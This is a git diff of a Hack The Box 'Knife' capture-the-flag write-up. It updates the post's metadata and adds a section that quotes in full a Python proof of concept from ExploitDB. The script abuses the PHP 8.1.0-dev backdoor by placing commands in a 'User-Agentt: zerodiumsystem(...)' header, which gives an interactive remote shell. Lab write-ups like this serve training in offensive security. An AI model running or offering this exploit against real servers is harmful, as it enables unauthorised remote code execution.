@@ -17,13 +17,13 @@ output: html_document
  </div> 
 
 <div class="img_container">
-![desc]({{https://jsom1.github.io/}}/_images/htb_cap_desc.png){: height="600px" width = 800px"}
+![desc]({{https://jsom1.github.io/}}/_images/htb_knife_desc.png){: height="600px" width = 800px"}
 </div>
 
 **Ports/services exploited:** -\\
 **Tools:** dirb, nikto\\
-**Techniques:** -\\
-**Keywords:** \\
+**Techniques:** RCE\\
+**Keywords:** CVE, /dev/tcp, reverse shell\\
 
 
 ## 1. Port scanning
@@ -153,6 +153,43 @@ We see the user james. Because the user flag (*user.txt*) is always in the user'
 
 And that's it for the user! It's not a very elegant solution, but it's working so this is what matters... In it's early stages, hacking consisted of writing clean, concise and elegant code, but nowadays it's more about finding tricks to get what we want.\\
 With that being said, it would still be helpful to get a shell as james. The reason is that it would be much more simple for enumation. We could of course do it the way we got the user flag, but that would be tedious at it means sending and tampering a request for each command...
+Looking back at Google, there are differnt python PoCs that exploit that vulnerability. Here's the code of one hosted on ExploitDB (https://www.exploit-db.com/exploits/49933). See the link for the details:
+
+````
+#!/usr/bin/env python3
+import os
+import re
+import requests
+
+host = input("Enter the full host url:\n")
+request = requests.Session()
+response = request.get(host)
+
+if str(response) == '<Response [200]>':
+    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
+    try:
+        while 1:
+            cmd = input("$ ")
+            headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>',1)
+            text = print(stdout[0])
+    except KeyboardInterrupt:
+        print("Exiting...")
+        exit
+
+else:
+    print("\r")
+    print(response)
+    print("Host is not available, aborting...")
+    exit
+``````
+
+We download or copy this script on our Kali machine (I named it *php_8.1.0-dev-backdoor.py*) and execute it:
 
 
 
